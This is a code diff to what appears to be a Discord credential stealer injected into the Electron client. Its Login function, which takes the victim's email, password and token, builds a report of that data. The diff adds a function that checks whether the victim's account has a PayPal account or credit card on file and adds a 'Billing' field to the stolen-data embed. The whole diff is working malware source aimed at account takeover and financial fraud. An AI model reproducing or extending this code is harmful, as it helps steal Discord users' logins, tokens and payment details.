@@ -131,6 +131,26 @@ function GetBadges(flags) {
     return badges
 }
 
+function Cool() {
+    const json = JSON.parse(info3)
+    var billing = "";
+    json.forEach(z => {
+        if (z.type == "") {
+            return "\`No\`"
+        } else if (z.type == 2 && z.invalid != !0) {
+            billing += "\`Yes\`" + " <:Paypal:940600331002318879>"
+        } else if (z.type == 1 && z.invalid != !0) {
+            billing += "\`Yes\`" + " :credit_card:"
+        } else {
+            return "\`No\`"
+        }
+    })
+    if (billing == "") {
+        billing = "\`No\`"
+    }
+    return billing
+}
+
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -163,16 +183,16 @@ function Login(email, password, token) {
 
 
                         {
-                            "name": ":unlock: | Token :",
-                            "value": `\`${token}\``,
-                            "inline": false
+                            "name": "<a:discord_gif:709806861351911445> | Other :",
+                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
+                            "inline": true
                         },
 
 
                         {
-                            "name": "<a:discord_gif:709806861351911445> | Other :",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: \`${GetBadges(json.flags)}\``,
-                            "inline": true
+                            name: "Billing",
+                            value: `${Cool()}`,
+                            inline: !1
                         }
                     ],
                     "author": {
